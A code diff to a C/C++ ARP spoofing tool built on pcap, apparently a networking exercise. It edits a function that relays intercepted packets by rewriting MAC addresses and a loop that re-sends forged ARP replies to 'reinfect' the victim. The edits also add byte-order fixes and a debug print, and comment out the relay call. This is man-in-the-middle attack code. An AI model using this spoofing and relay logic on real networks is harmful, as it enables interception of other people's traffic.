@@ -104,11 +104,12 @@ bool isRefreshed(pcap_t* handle, const u_char *receivedPkt, FlowInfo flow)
 void relayPacket(pcap_t *handle, const u_char *receivedPkt, FlowInfo flow)
 {
 	// Check that receivedPkt is from sender, and destination mac is attacker(me)
-	if(((EthIpPacket *)receivedPkt)->eth_.type_ == EthHdr::Ip4 || ((EthIpPacket *)receivedPkt)->eth_.type_ == EthHdr::Ip6 &&
+	if(ntohs(((EthIpPacket *)receivedPkt)->eth_.type_) == EthHdr::Ip4 || ntohs(((EthIpPacket *)receivedPkt)->eth_.type_) == EthHdr::Ip6 &&
 	((EthIpPacket *)receivedPkt)->eth_.dmac_ == flow.attackerMac)
 	{
+		printf("hello\n");
 		// Check if it's the receivedPkt for attacker(me)
-		if(((EthIpPacket *)receivedPkt)->ip_.dip_ != flow.attackerIp)
+		if(ntohl(((EthIpPacket *)receivedPkt)->ip_.dip_) != flow.attackerIp)
 		{ // if it is not the packet for me, modify and relay the packet
 			((EthIpPacket *)receivedPkt)->eth_.smac_ = flow.attackerMac;
 			((EthIpPacket *)receivedPkt)->eth_.dmac_ = flow.targetMac;
@@ -136,13 +137,13 @@ void spoofProcess(int mode, pcap_t *handle, EthArpPacket pkt, FlowInfo flow)
 
 		if (isRefreshed(handle, receivedPkt, flow))
 		{
+			printf("[*] Reinfect sender..\n");
 			sendArp(handle, pkt);
-
 		}
-		else
-		{
-			relayPacket(handle, receivedPkt, flow);
-		}
+		// else
+		// {
+		// 	relayPacket(handle, receivedPkt, flow);
+		// }
 			
 	}
 
